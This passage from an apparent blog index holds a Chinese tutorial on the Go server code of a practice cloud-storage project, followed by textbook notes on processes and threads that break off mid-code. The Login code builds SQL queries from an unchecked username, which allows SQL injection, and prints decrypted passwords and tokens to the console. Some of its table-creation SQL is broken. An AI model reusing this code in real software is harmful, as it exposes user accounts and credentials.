英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/23/os-concepts-3/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"顶点云（应用）服务器逻辑实现","slug":"zenith-cloud-6","date":"2016-11-23T10:42:08.000Z","updated":"2016-12-23T17:33:00.000Z","comments":true,"path":"2016/11/23/zenith-cloud-6/","link":"","permalink":"http://forec.github.io/2016/11/23/zenith-cloud-6/","excerpt":"分析、设计云存储服务器的执行逻辑，包括用户验证登录、活动连接加入与释放、代理操作等。","text":"分析、设计云存储服务器的执行逻辑，包括用户验证登录、活动连接加入与释放、代理操作等。 服务器结构分析 服务器可按初始化、监听、fork 出线程处理用户请求并继续监听流程处理。在对用户请求新建分支处理时，按照此前 认证、传输协议设计 设计的登录、传输线程接入流程处理。 服务器应当维护一个主要的监听器，一个已登录用户列表以及对数据库操作的接口，其数据结构如下： 12345type Server struct &#123; listener net.Listener loginUserList []cs.User db *sql.DB&#125; 服务器应当封装如下方法： 123456789func (s *Server) InitDB() bool // 初始化数据库func (s *Server) BroadCastToAll(message string) // 向全体用户广播消息func (s *Server) BroadCast(u cs.User, message string) bool // 向指定用户发送消息func (s *Server) CheckBroadCast() // 用户间通信检查（负责用户之间的短时延通讯）func (s *Server) AddUser(u cs.User) // 向在线列表添加用户func (s *Server) RemoveUser(u cs.User) bool // 从在线列表删除用户func (s *Server) Login(t trans.Transmitable) (cs.User, int) // 授权用户登录func (s *Server) Communicate(conn net.Conn, level uint8) // 处理一个接入的未授权请求func (s *Server) Run(ip string, port int, level int) // 监听指定地址并运行 在工程目录下新建 server 目录，要编写的模块名为 server。在该目录下创建文件 server.go， 以下代码均在该文件中编辑。 我们的代码中使用到的包通过如下代码导入： 123456789101112import ( auth \"zenith-cloud/authenticate\" conf \"zenith-cloud/config\" cs \"zenith-cloud/cstruct\" trans \"zenith-cloud/transmit\" \"database/sql\" \"fmt\" _ \"github.com/mattn/go-sqlite3\" \"net\" \"strings\" \"time\") 初始化 根据 此前对数据库的设计，我们需要在程序运行过程中维护五个表记录，在程序运行前应当对数据库和对应表的存在加以检查。 按照设计的数据库表实现的 InitDB() 代码如下： 123456789101112131415161718192021func (s *Server) InitDB() bool &#123; var err error s.db, err = sql.Open(conf.DATABASE_TYPE, conf.DATABASE_PATH) if err != nil &#123; return false &#125; s.db.Exec(`create table cuser (uid INTEGER PRIMARY KEY AUTOINCREMENT, username VARCHAR(64), password VARCHAR(128), created DATE)`) s.db.Exec(`create table ufile (uid INTEGER PRIMARY KEY AUTOINCREMENT, ownerid INTEGER, cfileid INTEGER, path VARCHAR(256), perlink VARCHAR(128), created DATE, shared INTEGER, downloaded INTEGER, filename VARCHAR(128), private BOOLEAN, linkpass VARCHAR(4)), isdir BOOLEAN`) s.db.Exec(`create table cfile (uid INTEGER PRIMARY KEY AUTOINCREMENT, md5 VARCHAR(32), size INTEGER, ref INTEGER, created DATE)`) s.db.Exec(`create table cmessages (mesid INTEGER PRIMARY KEY AUTOINCREMENT, targetid INTEGER, sendid INTEGER, message VARCHAR(512), created DATE)`) s.db.Exec(`crete table coperations (oprid INTEGER PRIMARY KEY AUTOINCREMENT, deletedUFileId INTEGER, deletedUFileName VARCHAR(128), deletedUFilePath VARCHAR(256), relatedCFileId INTEGER, time DATE)`) return true&#125; 程序将先检查数据库是否存在，不存在则自动创建（sql.Open 函数会在数据库不存在时自动创建新数据库），之后不管表记录是否存在均新建表（若已存在则不会覆盖）。 消息广播 消息广播通过每个用户客户端设置的被动监听连接传输 系统向所有用户广播，只需对所有在线用户均调用 BroadCast()，具体实现如下： 123456789101112func (s *Server) BroadCast(u cs.User, message string) bool &#123; if u.GetInfos() == nil &#123; return false &#125; return u.GetInfos().SendBytes([]byte(message))&#125;func (s *Server) BroadCastToAll(message string) &#123; for _, u := range s.loginUserList &#123; s.BroadCast(u, message) &#125;&#125; 用户之间的通讯需要服务器作为中转。然而，服务器将用户逻辑处理交予 cuser 结构代理，我们希望用户 cuser 结构和服务器 server 结构尽可能避免耦合，因此用户不应当在自己的 dealWithRequests() 逻辑中调用服务器的 BroadCast() 方法；另外，用户不应该具有判断另一用户是否在线的权限，因此即使用户具有与 BroadCast() 类似的方法，它也无法判断是否该立刻将待发送的消息投放给接收方。 这里采取一个 naive 但是有效的方法：用户发送 send 指令通讯时，要发送的消息会被存储到 cmessage 表中，我们在服务器中启动一个守护线程，监视 cmessage 表，并在固定时间频率时刻检查该表是否有待发送消息，如果有则将可发送的（接收方用户在线）部分消息投放给接收方，并从 cmessage 表中删除投放成功的消息。我们的检查频率会比较快（如几秒一次），用户之间通讯的延迟将在可忍受范围内，毕竟我们要实现的是云存储系统而非即时通讯系统。用户结构和服务器结构保持了分离，用户也没有具有不该有的权限。 用于处理用户间通讯交互的方法是 CheckBroadCast()，其具体实现如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849func (s *Server) CheckBroadCast() &#123; chRate := time.Tick(conf.CHECK_MESSAGE_SEPERATE * time.Second) var queryRows *sql.Rows var queryRow *sql.Row var mesid, uid, messageCount int var message, created string var err error for &#123; &lt;-chRate for _, u := range s.loginUserList &#123; queryRow = s.db.QueryRow(fmt.Sprintf(`select count (*) from cmessages where targetid=%d`, u.GetId())) if queryRow == nil &#123; continue &#125; err = queryRow.Scan(&amp;messageCount) if err != nil &#123; continue &#125; id_list := make([]int, 0, messageCount) queryRows, err = s.db.Query(fmt.Sprintf(`select mesid, sendid, message, created from cmessages where targetid=%d`, u.GetId())) if err != nil &#123; fmt.Println(\"query error: \", err.Error()) continue &#125; for queryRows.Next() &#123; err = queryRows.Scan(&amp;mesid, &amp;uid, &amp;message, &amp;created) if err != nil &#123; fmt.Println(\"scan error: \", err.Error()) break &#125; if s.BroadCast(u, fmt.Sprintf(\"%d%s%s%s%s\", uid, conf.SEPERATER, message, conf.SEPERATER, created)) &#123; id_list = append(id_list, mesid) &#125; else &#123; break &#125; &#125; for _, id := range id_list &#123; _, err = s.db.Exec(fmt.Sprintf(`delete from cmessages where mesid=%d`, id)) if err != nil &#123; fmt.Println(\"delete error: \", err.Error()) continue &#125; &#125; &#125; &#125;&#125; 运行 我们将从上向下分析服务器的运行逻辑 服务器应当对指定端口监听并能够对介入请求创建一个新协程处理： 1234567891011121314151617181920212223func (s *Server) Run(ip string, port int, level int) &#123; if !trans.IsIpValid(ip) || !trans.IsPortValid(port) &#123; return &#125; var err error s.listener, err = net.Listen(\"tcp\", fmt.Sprintf(\"%s:%d\", ip, port)) if err != nil &#123; fmt.Println(\"test server starting with an error, break down...\") return &#125; defer s.listener.Close() s.loginUserList = make([]cs.User, 0, conf.START_USER_LIST) for &#123; sconn, err := s.listener.Accept() if err != nil &#123; fmt.Println(\"Error accepting\", err.Error()) continue &#125; fmt.Println(\"Rececive connection request from\", sconn.RemoteAddr().String()) go s.Communicate(sconn, uint8(level)) &#125;&#125; 在运行开始时，还应当对在线用户列表做初始化，并将服务器放置在 for 循环中无线监听。当有请求接入，服务器创建一个新的协程来处理请求。传给协程的参数是对应的连接和安全等级。 处理未授权请求 Communicate 函数用于处理接入服务器但未经授权的请求。服务器要和对方做一定交互以确定远端身份，不合法时要即时断开腾出资源，多次不合法时也要采取防范攻击的措施。鉴于我们设计的云存储仅仅是练习，并不会投入生产中，因此暂不考虑诸如 SYN 洪水攻击等 DDOS 可能性。在后面我会展示 DDOS 攻击对我设计的云存储系统带来的打击。 Communicate 函数接受与远端的连接以及安全等级。它将按照此前设计的协议与远端交互： 生成一个随机 token，发送给客户端 客户端使用此 token 和服务器做一系列交互，并确定是否合法（login 函数） 返回授权结果 Communicate 函数的 Go 语言实现如下： 12345678910111213141516171819202122232425262728293031func (s *Server) Communicate(conn net.Conn, level uint8) &#123; var err error s_token := auth.GenerateToken(level) length, err := conn.Write([]byte(s_token)) fmt.Println(\"send toekn\", string(s_token)) if length != conf.TOKEN_LENGTH(level) || err != nil &#123; return &#125; mainT := trans.NewTransmitter(conn, conf.AUTHEN_BUFSIZE, s_token) rc, mode := s.Login(mainT) if rc == nil || mode == -1 &#123; mainT.Destroy() return &#125; if !mainT.SendBytes(s_token) &#123; return &#125; if mode == 0 &#123; rc.SetToken(string(s_token)) // 为新登录用户设置 token s.AddUser(rc) // 加入在线用户列表 rc.DealWithRequests(s.db) // 处理用户请求 rc.Logout() // 登出用户 s.RemoveUser(rc) // 从在线用户列表移除该用户 &#125; else if mode == 1 &amp;&amp; mainT.SetBuflen(conf.BUFLEN) &amp;&amp; rc.AddTransmit(mainT) &#123; rc.DealWithTransmission(s.db, mainT) &#125; else if mode != 2 &#123; mainT.Destroy() fmt.Println(\"Remote client not valid\") &#125;&#125; 上面的代码中，10 行以前均为服务器生成 token 并发送 token。之后，服务器生成了一个 transmitter 来交给 Login 函数验证该连接合法性。Login 函数会返回一个指向用户的指针，以及一个 int 类型的 code，code 说明了验证的结果： code 为 0：用户登陆成功 code 为 1：用户已经登陆，当前连接是用于传输长数据流的连接 code 为 2：用户已经登录，当前连接是用于被动监听广播的连接 code 为-1：用户因为某种原因不合法（如密码不匹配，token不一致，数据库出错等） DealWithRequests() 函数在之前已经介绍过一次，用来代理用户处理请求。该函数内部是一个 for 循环，不断监听用户发送的命令，当用户选择退出时才会跳出循环。 Login 函数完成了 Communicate 函数验证连接是否合法的任务，它的实现会比较复杂，主要难度在对各种异常的容错上。 将用户添加到在线列表和从在线列表中删除用户的函数非常简单，代码如下，不再解释： 12345678910111213func (s *Server) AddUser(u cs.User) &#123; s.loginUserList = cs.AppendUser(s.loginUserList, u)&#125;func (s *Server) RemoveUser(u cs.User) bool &#123; for i, uc := range s.loginUserList &#123; if uc == u &#123; s.loginUserList = append(s.loginUserList[:i], s.loginUserList[i+1:]...) return true &#125; &#125; return false&#125; 校验用户身份 我们还剩下最后一部分逻辑没有实现，即对用户登录身份的验证。 Login 函数非常复杂，因为它需要处理用户的任何不合法行为，以及对用户的登录模式做出判断。用中文将 Login 的函数流程表达如下： 服务器按照协议接收用户发送的用户名和密文的头部，共 24 字节，分别对应明文长度、包长度和用户名明文长度 服务器解析出包长度，并接收到完整的用户名+密码包，若接收时中断则退出 服务器解析出用户名和密码，若无法解析则退出 服务器检查已登录用户列表，是否存在该用户名，存在则转入活动连接判断模式，否则转 7 继续进行登录认证 服务器发现用户已登录，则认为该连接用来传输长数据流，或用来做被动监听 服务器对比解析出的密码和登录用户的 token 做比对，如果相同，则认为合法，否则退出。若相同，则观察该用户是否已具有 info 连接（即被动监听连接），若已存在 info 则认为该连接是长数据流传输，返回用户指针和模式 1；否则将该连接设置为用户的 info 并返回用户指针和模式 2 若第 4 步服务器检查登录用户列表并未发现该用户，则认为该用户未登录，此时在数据库中查找该用户，查找不到则退出 比对查找到的用户密码和用户传输的密码是否相同，不同则退出 用户密码相同，则统计用户已使用的云存储空间，并将已使用的空间设置到用户结构中 返回用户指针和 0，表示用户登录成功 Login 实现代码如下，大量篇幅用于 if 和 err 的处理上： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091func (s *Server) Login(t trans.Transmitable) (cs.User, int) &#123; // mode : failed=-1, new=0, transmission=1 chRate := time.Tick(1e3) var recvL int64 = 0 var err error recvL, err = t.RecvUntil(int64(24), recvL, chRate) if err != nil &#123; fmt.Println(\"1 error:\", err.Error()) return nil, -1 &#125; srcLength := auth.BytesToInt64(t.GetBuf()[:8]) encLength := auth.BytesToInt64(t.GetBuf()[8:16]) nmLength := auth.BytesToInt64(t.GetBuf()[16:24]) recvL, err = t.RecvUntil(encLength, recvL, chRate) if err != nil &#123; fmt.Println(\"2 error:\", err.Error()) return nil, -1 &#125; var nameApass []byte nameApass, err = auth.AesDecode(t.GetBuf()[24:24+encLength], srcLength, t.GetBlock()) if err != nil &#123; fmt.Println(\"decode error:\", err.Error()) return nil, -1 &#125; fmt.Println(string(nameApass[:nmLength]), string(nameApass[nmLength:])) pc := cs.UserIndexByName(s.loginUserList, string(nameApass[:nmLength])) // 该连接由已登陆用户建立 if pc != nil &#123; fmt.Println(\"userfined, \", pc.GetUsername()) fmt.Println(\"pc token is \", pc.GetToken()) if pc.GetToken() != string(nameApass[nmLength:]) &#123; fmt.Println(\"token verify error! not valid!\") return nil, -1 &#125; else &#123; // background message receiver if pc.GetInfos() == nil &#123; pc.SetInfos(t) return pc, 2 &#125; else &#123; // transmission return pc, 1 &#125; &#125; &#125; // 该连接来自新用户 username := string(nameApass[:nmLength]) row := s.db.QueryRow(fmt.Sprintf(\"SELECT * FROM cuser where username='%s'\", username)) if row == nil &#123; return nil, -1 &#125; var uid int var susername string var spassword string var screated string err = row.Scan(&amp;uid, &amp;susername, &amp;spassword, &amp;screated) if err != nil || spassword != strings.ToUpper(string(nameApass[nmLength:])) &#123; return nil, -1 &#125; rc := cs.NewCUser(string(nameApass[:nmLength]), int64(uid), \"/\") if rc == nil &#123; return nil, -1 &#125; rc.SetListener(t) // 统计用户已使用的云存储空间 rows, err := s.db.Query(fmt.Sprintf(\"SELECT cfileid FROM ufile where ownerid=%d\", uid)) if err != nil &#123; return nil, -1 &#125; defer rows.Close() var cid, size int var totalSize int64 = 0 for rows.Next() &#123; err = rows.Scan(&amp;cid) if err != nil || cid &lt; 0&#123; continue &#125; row = s.db.QueryRow(fmt.Sprintf(\"select size from cfile where uid=%d\", cid)) if row == nil &#123; continue &#125; err = row.Scan(&amp;size) if err != nil &#123; continue &#125; totalSize += int64(size) &#125; rc.SetUsed(int64(totalSize)) return rc, 0&#125; 上面的代码基本遵循中文描述的过程，细节方面实现可能有顺序偏差，但大体一致。注意 Login 中对数据库查询出现错误的不同处理，在不影响用户正常行为逻辑的情况下，无所谓的错误可以用 continue 跳过。服务器会按一定周期检查有无遗失的文件记录。 专栏目录：顶点云（应用）设计与实现此专栏的上一篇文章：顶点云（应用）传输、认证单元测试此专栏的下一篇文章：顶点云（应用）用户代理 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/23/zenith-cloud-6/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://forec.github.io/tags/Golang/"},{"name":"云存储","slug":"云存储","permalink":"http://forec.github.io/tags/云存储/"},{"name":"线程","slug":"线程","permalink":"http://forec.github.io/tags/线程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"操作系统（二）：进程与线程","slug":"os-concepts-2","date":"2016-11-22T11:02:51.000Z","updated":"2017-01-06T11:23:02.000Z","comments":true,"path":"2016/11/22/os-concepts-2/","link":"","permalink":"http://forec.github.io/2016/11/22/os-concepts-2/","excerpt":"整理《Operating System Concepts》 第七版第三、四章的理论和概念，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。","text":"整理《Operating System Concepts》 第七版第三、四章的理论和概念，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。 进程（第三章）概念与调度 进程可看作正在执行的程序，是大多数系统中的工作单元。进程除了包括程序代码（有时也称作 文本段 ），还包括用 程序计数器 和处理器寄存器来表示的当前活动。进程通常还包括进程 堆栈段（stack） 和 数据段（data section） ，其中堆栈段保存临时数据如函数参数、返回地址、局部变量，数据段保存全局变量。进程还可能包括 堆（heap） ，堆是进程运行期间动态分配的内存。 进程在执行中会改变 状态（state） ，每个进程可能处于下列状态： 创建（New） ：进程正在被创建 运行（Running） ：进程正在被执行 等待（Waiting） ：进程在等待某个事件发生（如 I/O 完成或接收到某个信号） 就绪（Ready） ：进程等待分配处理器 终止（Terminated） ：进程完成执行 一次只有 一个进程 可以在 一个处理器 上 运行 ，但可以有多个进程处于 就绪 或 等待 状态。进程状态转移如下图，图片根据原书内容制作。 每个进程在操作系统内部用 进程控制块（process control block，PCB） 来表示，它包含了与一个特定进程相关的信息。每个进程控制块包含： 进程状态（process state） ：可为上述五种状态 程序计数器（program counter） ：指定进程要执行的下条指令地址 CPU 寄存器 ：根据计算机体系结构的不同，寄存器数量、类型也不同，多数包括累加器、索引寄存器、堆栈指针、通用寄存器等 CPU 调度信息（CPU-scheduling information） ：包括进程优先级、调度队列的指针和其它调度参数 内存管理信息（memory-management information） ：根据内存系统，通常包括基址、界限寄存器值、页表或段表 统计信息（accounting information） ：包括 CPU 时间、实际使用时间、时间界限、统计数据、作业/进程数量等 I/O 状态信息 ：包括分配给进程的 I/O 设备列表、打开的文件列表等 进程调度器（process scheduler） 选择一个可用的进程到 CPU 中执行。进程进入系统时会被加入到 作业队列（job queue） 中，该队列包括系统中所有进程。保留在主存中且准备就绪等待运行的进程被保存在 就绪队列（ready queue） 中，该队列通常用链表实现，头节点指向了链表的第一个和最后一个 PCB 块指针，每个PCB 包括指向就绪队列的下一个 PCB 的指针。有些进程向共享设备（如磁盘）发送 I/O 请求，若磁盘正忙则该进程需要等待。等待特定 I/O 设备的进程列表称为 设备队列（device queue） ，每个设备都有自己的设备队列。 新进程开始时处于就绪队列，它在就绪队列中等待直到被选中执行或 派遣（dispatched） 。一旦进程被分配 CPU 并开始执行，可能发生以下事件。在前两种情况中，经过一定时间的等待，进程最终会从等待状态切换回就绪状态，并放回到就绪队列中。 进程发出一个 I/O 请求并被放到 I/O 队列中 进程创建一个新的子进程并等待其结束 进程由于中断强制释放 CPU，并被放回到就绪队列中 操作系统从队列中选择进程的操作由 调度程序（scheduler） 执行。在批处理系统中，进程被放到大容量存储设备（如磁盘）的缓冲池（作业池）中等待执行。 长期调度程序（long-term scheduler） 或 作业调度程序（job scheduler） 从缓冲池选择进程、装入内存以准备执行，而 短期调度程序（short-term scheduler） 或 CPU 调度程序 从准备执行的进程中选择并分配 CPU。二者的区别主要体现在 执行的频率不同 。短期调度程序非常频繁地执行，为CPU选择新进程，如果短期调度需要 10ms 来确定执行一个运行 100ms 的进程，则 10/(100+10) = 9% 的CPU时间浪费在了调度工作上；而长期调度程序执行不频繁，可能数分钟调度一次，它控制 多道程序设计的程度（degree of multiprogramming） ，即内存中的进程数量。只有进程离开系统后才可能需要调度长期调度程序。 有些系统没有/少有长期调度程序，如 UNIX 或 Windows 的分时系统通常没有长期调度程序，它们仅仅简单的将所有新进程放到内存中以供短期调度程序使用。有些系统如分时系统可能引入 中期调度系统（medium-term scheduler） ，它可以将进程从内存（或 CPU 竞争）中移出，从而降低多道程序设计的程度。之后，这些进程可以被重新调入内存并从中断处继续执行。这种行为称为 交换（swapping） 。有时因为内存要求的改变导致可用内存过度使用，此时便需要交换。 将 CPU 切换到另一个进程需要保存当前进程状态并恢复另一个进程的状态，此任务称为 上下文切换（context switch） 。内核会将旧进程的状态保存在其 PCB 中，并装入调度后要执行的并已恢复的新进程的上下文。上下文切换的时间与硬件支持相关。 进程操作 进程在其执行过程中能通过创建进程系统调用（create-process system call）创建多个新进程。创建进程称为 父（parent）进程 ，被创建的新进程称为 子（children）进程 。每个新进程可以再创建其他进程以形成 进程树（tree） 。 多数操作系统根据一个唯一的 进程标识符（process identifier，pid） 来识别进程，通常是整数值。 一个进程创建子进程时，子进程可能通过以下方式获取资源： 从操作系统直接获取资源 获取父进程资源。父进程需要在子进程之间分配或共享资源，父进程可以选择和子进程分享全部资源、分享部分资源、不分享资源 进程创建时，除了得到各种物理和逻辑资源，初始化数据（或输入）由父进程传递给子进程。 当进程创建新进程时，存在两种执行可能： 父进程和子进程并发执行 父进程等待，直到某个或全部子进程执行完 新进程的地址空间有两种可能： 子进程是父进程的副本，具有和父进程相同的程序和数据 子进程装入另一个新程序 在 UNIX 中，通过 fork() 系统调用创建新进程，新进程通过 复制原来进程的地址空间形成 。两个进程（父进程、子进程）均继续执行位于系统调用 fork() 之后的指令，对于子进程，系统调用 fork() 返回值为 0，而父进程的返回值为子进程的 pid。 在系统调用 fork() 后，一个进程会使用系统调用 exec() 以使用新程序取代进程内存空间并开始执行。这样两个进程可以相互通信且执行各自程序。如果父进程在子进程运行时需要等待，则采用系统调用 wait() 将自己移出就绪队列来等待子进程终止。 以下是 UNIX 系统一个 C 语言例程，来自原书第 92 页。 123456789101112131415#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main()&#123; pid_t pid; pid = fork(); // fork a child process if (pid &lt; 0)&#123; // error occurred exit(-1); &#125; else if (pid == 0)&#123; // child process execlp(\"/bin/ls\", \"ls\", NULL); &#125; else &#123; // parent process wait(NULL); exit(0); &#125;&#125; 以下是 Win32 API 生成一个单独进程的 C 语言例程，来自原书第 94 页。 1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main()&#123; STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); // allocate memory si.cb = sizeof(si); ZeroMemory(&amp;pi, sizeof(pi)); if (!CreateProcess(NULL, // use command line \"C:\\\\WINDOWS\\\\system32\\\\mspaint.exe\", NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi))&#123; return -1; // create process failed &#125; WaitForSingleObject(pi.hProcess, INFINITE); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);&#125; 进程终止和通信 进程完成执行最后的语句并使用系统调用 exit() 时进程终止，此时进程可以返回状态值（通常为整数）给父进程（通过wait()获取），所有进程资源也会被操作系统释放。 进程通过系统调用（如 Win32 的 TerminateProcess()）可以终止另一个进程，通常只有被终止进程的父进程才能执行该操作。父进程终止子进程的原因如： 子进程使用了超出其所分配的资源 子进程所分配的任务已不需要 父进程退出（在有的系统中，如果父进程终止，则其所有子进程也终止，此现象称为 级联终止（cascading termination） 。而在 UNIX 中，若父进程终止，其所有子进程会以 init 进程作为父进程，因此子进程仍然有一个父进程来收集状态和执行统计。） 操作系统内并发执行的进程可以为 独立进程 或 协作进程 。如果一个进程不能影响其他进程，也不能被其他进程所影响，则该进程是 独立（independent） 的，否则该进程是 协作（cooperating） 的。进程协作的原因有很多，如： 信息共享（information sharing） ：多个用户需要同一个共享文件 提高运算速度（computation speedup） ：要使一个特定任务快速运行，则需要将其分成子任务以并行执行，这需要计算机有多个处理单元（CPU或 I/O通道） 模块化（modularity） ：需要按模块化方式构造系统 方便 ：单个用户可同时执行多个任务 进程协作需要 进程间通信机制（interprocess communication， IPC） 来允许进程相互交换数据，其包括两种基本模式： 共享内存（shared memory） ：通信进程需要建立内存共享区域 消息传递（massage passing） ：在分布式环境中非常有用，通信进程之间必须有 通信线路（communication link） 。对于 直接通信 ，采用对称寻址，每个进程必须明确地命名通信的接收者或发送者； 间接通信 中，通过 邮箱（mailboxes） 或 端口（ports） 来发送和接收消息，每个邮箱都有唯一的标识符，两个进程仅在其共享至少一个邮箱时可相互通信，一个进程可通过许多不同的邮箱和其他进程通信。 对于使用邮箱的间接通信，通信线路有如下属性： 只有在两个进程共享一个邮箱时才能建立通信线路 一个线路可以与两个或更多的进程相关联 两个通信进程之间可有多个不同线路，每个线路对应一个邮箱 若多个进程共享同一个邮箱，例如进程 P1、P2、P3均共享邮箱 A，进程 P1 发送一个消息到 A，进程 P2 和 P3 同时对邮箱 A 执行 receive()，则结果取决于所选用的方案： 允许一个线路最多只能与两个进程相关联 一次最多允许一个进程执行 receive() 操作 允许系统随意选择一个进程接收消息 由操作系统所拥有的邮箱是独立存在的，不属于某个特定的进程。创建新邮箱的进程默认为邮箱拥有者，通过系统调用，拥有和接收的特权可能传递给其他进程。 消息传递可以是 阻塞（blocking） 或者 非阻塞（nonblocking） ，也称为 同步（synchronous） 或 异步（asynchronous） 。 阻塞发送：发送进程阻塞直到消息被接收进程或邮箱接收 非阻塞发送：发送进程可直接发送消息并继续操作 阻塞接收：接收者阻塞直到有可用消息 非阻塞接收：接收者可以直接收到一个有效消息或空消息 IPC 系统示例，Windows XP：Windows XP 的消息传递工具称为 本地过程调用（local procedure call，LPC） 工具，在位于同一机器的两个进程之间通信。Windows XP 使用了端口对象以建立、维持两个进程之间的链接。通信工作如下，如果客户端要发送更大的消息，则可通过 区段对象（section object） 来构建共享内存传递消息。注意，LPC 不是 Win32 API 的一部分，所以对应用程序不可见。 客户端打开系统的连接端口对象句柄 客户端发送连接请求 服务器创建两个私有通信端口，并返回其中之一的句柄给客户端 客户端和服务器使用相应端口句柄以发送消息或回调，并等待回答 例程，C 程序调用 POSIX 系统下的共享内存 API，来自原书（英文版）第 104 页。 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;sys/shm.h&gt;#include &lt;sys/stat.h&gt;int main()&#123; int segment_id; char *shared_memory; // the size(bytes) of shared memory segment const int size = 4096; // allocate a shared memory segment segment_id = shmget(IPC_PRIVATE, size, S_IRUSR | S_IWUSR); // attach the shared memory segment shared_memory = (char *) shmat(segment_id, NULL, 0); // write a message to the shared memory segment sprintf(shared_memory, \"Hi there!\"); // print out the string from shared memory printf(\"*%s\\n\", shared_memory); // detach the shared memory segment shmdt(shared_memory); // remove the shared memory segment shmctl(segment_id, IPC_RMID, NULL); return 0;&#125; 管道（补充） 管道（pipe） 是一条在进程间以字节流方式传送数据的通信通道，由OS核心的缓冲区（通常几十KB）来实现，为单向。 管道常用于命令行所指定的输入输出重定向和管道命令，使用前要建立相应的管道。管道逻辑上可以看作管道文件，物理上则是由文件系统的高速缓存区构成。 管道分为 有名管道 和 无名管道 ，按先进先出（FIFO）的方式传送消息，且 只能单向传送消息 。 管道的发送和接受可使用如下操作： 发送进程利用文件系统的系统调用 write(fd[1], buf, size) 把 buf 中长度为 size 字符的消息送入管道入口 fd[1]； 接收进程利用文件系统的系统调用 read(fd[0], buf, size)从管道出口 fd[0] 读出 size 字符的消息放入 buf 中。 管道应用例程，来自李文生老师的操作系统幻灯片。 12345678910111213141516#include &lt;stdio.h&gt;int main()&#123; int pid,fd[2]; char buf[30], s[30]; pipe(fd); while((pid = fork()) == -1); if (pid==0)&#123; sprintf(buf, \"this is an example\\n\"); write(fd[1],buf,30); exit(0); &#125; else &#123; wait(0); read(fd[0], s, 30); printf(\"%s\",s); &#125;&#125; 线程（第四章） 线程是 CPU 使用的基本单元，由线程ID、程序计数器、寄存器集合和栈组成。它和 属于同一进程 的其他线程共享代码段、数据段和其他操作系统资源（打开文件、信号等）。传统 重量级（heavyweight） 的进程只有单个控制线程，若进程有多个控制线程，则可同时做多个任务。 多线程编程优点： 响应度高 资源共享：线程默认共享它们所属进程的资源和内存，它允许一个应用程序在同一地址空间有多个不同的活动线程 经济：线程创建所需的内存和资源较进程少很多 多处理器体系结构的利用：每个进程能并行运行在不同处理器上，加强了并发功能 多线程模型有两种方法提供线程支持：用户层的 用户线程（user threads） 和内核层的 内核线程（kernel threads） 。用户线程受到内核的 支持 ，但不需内核管理；内核线程 由操作系统直接支持和管理 。当代所有操作系统均支持内核线程。 多对一模型（Many-to-One） ：将多个用户级线程映射到一个内核线程。 线程管理是由线程库在用户空间进行的 ，效率较高； 若一个线程执行了阻塞系统调用，则整个进程都会阻塞 ，因为任一时刻只有一个线程能访问内核。 一对一模型（One-to-One） ：将每个用户线程映射到一个内核线程，该模型在一个线程执行系统调用时，能允许另一个线程继续执行，所以它提供了更好的并发性能；缺点在于每个用户线程需要创建一个对应的内核线程，因此限制了系统支持的线程数量。Linux 和 Windows 系列系统实现了一对一模型。 多对多模型（Many-to-Many） ：复用了许多用户线程到同样数量或者更小数量的内核线程上，开发人员可创建任意多的用户线程，并且相应内核线程能在多处理器系统上并发执行。一个流行的多对多模型的变种允许将一个用户线程绑定到某个内核线程上，这个变种有时称为 二级模型（two0level model） 。 线程库 线程库（thread library） 为程序员提供创建和管理线程的 API。有两种方法来实现： 在用户空间提供一个没有内核支持的库，此库的所有代码和数据结构均存在用户空间中，调用库中的一个函数只是导致用户空间中一个本地函数的调用，而非系统调用 执行一个由操作系统直接支持的内核级的库，库的代码和数据结构存储在内核空间中，调用库中的一个 API 会导致对内核的系统调用。 目前主要的三种线程库有：POSIX Pthread、Win32 和 Java。 Pthread 创建、执行线程的一个 C程序样例如下，例程来自原书（英文版）第 133 页。 12345678910111213141516171819202122232425262728#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;int sum = 0; // shared by threadvoid *runner(void *param); // threadint main(int argc, char *argv[])&#123; pthread_t tid; // pid pthread_attr_t attr; // set of thread attributes if (argc != 2)&#123; return -1; &#125; if (atoi(argv[1]) &lt; 0)&#123; return -1; &#125; // initialize the default attributes pthread_attr_init(&amp;attr); // create the thread pthread_create(&amp;tid, &amp;attr, runner, argv[1]); // wait for the thread to exit pthread_join(tid, NULL); printf(\"sum = %d\\n\", sum);&#125;void *runner(void *param)&#123; int i, upper = atoi(param); for (i = 1; i &lt;= upper; i++) sum += i; pthread_exit(0);&#125; Win32 线程库创建线程的例程如下，来自原书（英文版）第 135 页。 12345678910111213141516171819202122232425262728293031323334#include &lt;windows.h&gt;#include &lt;stdio.h&gt;DWORD sum = 0;DWORD WINAPI Summation(LPVOID Param)&#123; DWORD Upper = *(DWORD*)Param; for (DWORD i = 0; i &lt;= Upper; i++)&#123; Sum += i; &#125; return 0;&#125;int main(int argc, char *argv[])&#123; DWORD ThreadId; HANDLE ThreadHandle; int Param; if (argc != 2)&#123; return -1; 